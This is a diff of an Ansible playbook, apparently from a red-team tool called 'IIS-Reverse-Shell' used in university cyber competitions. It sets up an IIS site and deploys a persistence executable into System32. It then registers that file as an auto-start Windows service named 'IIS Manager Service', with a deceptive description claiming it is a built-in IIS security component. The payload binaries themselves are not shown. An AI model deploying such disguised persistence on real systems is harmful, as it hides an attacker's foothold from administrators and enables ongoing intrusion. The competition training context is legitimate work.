@@ -2,7 +2,7 @@
   hosts: all
   gather_facts: true
   vars:
-    Competition: "UB_Lockdown"
+    Competition: "UAlbany"
 
   tasks:
     - name: Installs IIS Web Service Features
@@ -60,17 +60,17 @@
         
     - name: Deploys index.html
       win_copy:
-        src: "~/IIS-Reverse-Shell/Website/{{ Competition }}.html"
+        src: "~/IIS-Reverse-Shell/Website/{{Competition}}/{{ Competition }}.html"
         dest: "C:\\inetpub\\{{ Competition }}"
         
     - name: Deploys web.config
       win_copy:
-        src: "~/IIS-Reverse-Shell/Website/web.config"
+        src: "~/IIS-Reverse-Shell/Website/{{Competition}}/web.config"
         dest: "C:\\inetpub\\{{ Competition }}"
         
     - name: Deploys button.js
       win_copy:
-        src: "~/IIS-Reverse-Shell/Website/button.js"
+        src: "~/IIS-Reverse-Shell/Website/{{Competition}}/button.js"
         dest: "C:\\inetpub\\{{ Competition }}"
     
     - name: Deploys search.php
@@ -88,7 +88,7 @@
       
     - name: Deploys Persistence Executable
       win_copy:
-        src: "~/IIS-Reverse-Shell/Persistence/Website Manager Service.exe"
+        src: "~/IIS-Reverse-Shell/Persistence/IIS Manager Service.exe"
         dest: "C:\\Windows\\System32"
      
     - name: Creates Competition Variable Registry Key
@@ -99,11 +99,11 @@
         type: string
         
     - name: Adds Executable to Services
-      win_shell:  New-Service -Name "Website Manager Service" -Binary "C:\Windows\System32\Website Manager Service.exe" -DisplayName "Website Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
+      win_shell:  New-Service -Name "IIS Manager Service" -Binary "C:\Windows\System32\IIS Manager Service.exe" -DisplayName "IIS Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
         
     - name: Starts Service
       win_service:
-        name: "Website Manager Service"
+        name: "IIS Manager Service"
         state: started
       ignore_errors: yes
       
